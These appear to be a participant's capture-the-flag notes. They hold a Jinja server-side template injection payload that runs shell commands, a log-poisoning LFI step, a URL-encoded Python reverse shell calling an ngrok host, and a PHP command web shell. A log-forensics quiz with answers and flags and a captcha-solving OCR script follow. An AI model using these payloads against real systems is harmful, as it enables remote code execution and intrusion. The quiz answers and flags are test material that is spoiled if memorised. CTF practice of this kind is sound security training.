1. SSTI

```http
http://109.205.181.210:18803/submit?comment={{+lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"]["popen"]("cat${IFS}flag.txt")["read"]()+}}
```

![[Pasted image 20251103122855.png]]

# Boot2root
- logpoisoning `http://109.205.181.210:12080/dev/l33t_lfi.php?fetch=/var/log/auth.log` via ssh
- `nc 109.205.181.210 12022`
https://meyerweb.com/eric/tools/dencoder/


```python

python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%227.tcp.eu.ngrok.io%22%2C11774))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27
```

send the following on the `nc`

```php

<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>

```







SADC{141.44.201.11_nmap_gobuster/3.5_sqlmap/1.7.6_/?sql_debug=1_sqli}


```
You are a cybersecurity analyst tasked with investigating a suspected security breach on a web server. The server's access.log file contains records of HTTP requests and server responses. Your goal is to examine this log file and answer a series of questions to piece together the sequence of events and identify the attack vector used by the attacker.

What is the IP address of the attacker?

141.44.201.11

What tool did the attacker use to scan for open ports and services?


- nmap

What tool did the attacker use to search for endpoints on the web application?Format (tool/version)

- gobuster/3.5


What other exploitation tool did the attacker tried to use to exploit the application?Format (tool/
version)

sqlmap/1.7.6

What endpoint did the other used to exploit the target? Format(/name/file)


What vulnerability did the attacker exploit to gain access to the target? Format(Name)

sqli

SADC{141.44.201.11_nmap_gobuster/3.5_sqlmap/1.7.6_sql_debug_sqli}
```



## OCR

```python

from PIL import Image
import requests as rq
from io import BytesIO
from bs4 import BeautifulSoup
import easyocr
import cv2
import numpy as np

def easy_ocr_captcha(image_data):
    """Extract text using EasyOCR"""
    # Initialize EasyOCR reader (you can specify languages)
    # 'en' for English, you can add more languages like ['en', 'fr']
    reader = easyocr.Reader(['en'])
    
    if isinstance(image_data, bytes):
        # Convert bytes to numpy array for OpenCV
        nparr = np.frombuffer(image_data, np.uint8)
        image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    else:
        # If it's a file path
        image = cv2.imread(image_data)
    
    # Perform OCR
    results = reader.readtext(image)
    
    # Extract and combine all detected text
    text = ' '.join([result[1] for result in results])
    return text.strip()

def get_status(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    return soup.find("strong")

def solve_captcha_with_easyocr():
    # Initial request to get captcha
    request = rq.get("http://109.205.181.210:13211/badass_captcha.php")
    cookies = request.cookies
    
    # Save captcha for debugging
    with open('captcha_easyocr.png', 'wb') as f:
        f.write(request.content)
    
    print("Captcha saved as 'captcha_easyocr.png'")
    
    # Use EasyOCR
    guess = easy_ocr_captcha(request.content)
    
    print("EasyOCR says:", repr(guess))
    
    if not guess:
        guess = input("OCR failed, please enter captcha manually: ")
    
    data = {'answer': guess, 'Submit': ""}
    request = rq.post("http://109.205.181.210:13211/processing.php", cookies=cookies, data=data)
    
    print("Response status:", request.status_code)
    print("Response text:", request.text)
    
    return request
```

```python
pip install pytesseract pillow requests
```